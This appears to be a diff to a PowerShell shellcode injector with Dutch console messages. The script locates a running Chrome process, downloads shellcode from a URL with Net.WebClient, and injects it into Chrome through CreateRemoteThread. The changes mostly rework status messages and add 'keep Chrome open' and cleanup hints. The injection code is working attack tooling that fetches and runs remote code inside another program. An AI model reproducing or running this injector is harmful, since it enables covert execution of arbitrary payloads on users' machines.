@@ -13,7 +13,7 @@ $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
 if (-not $edgeProcesses) {
     Write-Host "[*] Chrome niet gevonden, wordt gestart..." -ForegroundColor Yellow
     Start-Process "chrome"
-    Start-Sleep 6
+    Start-Sleep 2
     $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
 }
 
@@ -27,16 +27,14 @@ if (-not $edgeProcesses) {
 $targetProcess = $edgeProcesses | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -First 1
 
 if (-not $targetProcess) {
-    Write-Host "[-] Hoofdvenster niet gevonden! Valt terug op laagste memory proces." -ForegroundColor Yellow
+    Write-Host "[-] Hoofdvenster niet gevonden" -ForegroundColor Yellow
     $targetProcess = $edgeProcesses | Sort-Object WorkingSet64 -Ascending | Select-Object -First 1
 }
 
 $targetPID = $targetProcess.Id
 $memoryMB = [math]::Round($targetProcess.WorkingSet64 / 1MB, 1)
 
-Write-Host "[+] Hoofdvenster gekozen!" -ForegroundColor Green
-Write-Host "[+] PID: $targetPID  |  Geheugen: $memoryMB MB (Hoofdvenster)" -ForegroundColor Green
-Write-Host ""
+Write-Host "[+] PID: $targetPID" -ForegroundColor Green
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
@@ -46,7 +44,7 @@ try {
     pause
     exit
 }
-
+Write-Host "-----------------------------------------------"
 $size = $shellcode.Length
 
 Add-Type -MemberDefinition @"
@@ -81,9 +79,11 @@ try {
 
     $hThread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null)
     if ($hThread -eq [IntPtr]::Zero) { throw "CreateRemoteThread mislukt" }
-
-    Write-Host "[+] Injectie succesvol in Hoofdvenster (PID $targetPID)!" -ForegroundColor Green
-    Write-Host "[+] LAAT DIT CHROME VENSTER OPEN STAAN!" -ForegroundColor Red
+    Write-Host "-----------------------------------------------"
+    Write-Host "[+] Injectie succesvol!" -ForegroundColor Green
+    Write-Host "[x] Cleanen = END klikken of chrome sluiten" -ForegroundColor Yellow
+    Write-Host "[!] LAAT CHROME OPEN STAAN!" -ForegroundColor Red
+    Write-Host "---#CLEAN---" -ForegroundColor Pink
 } catch {
     Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
 } finally {
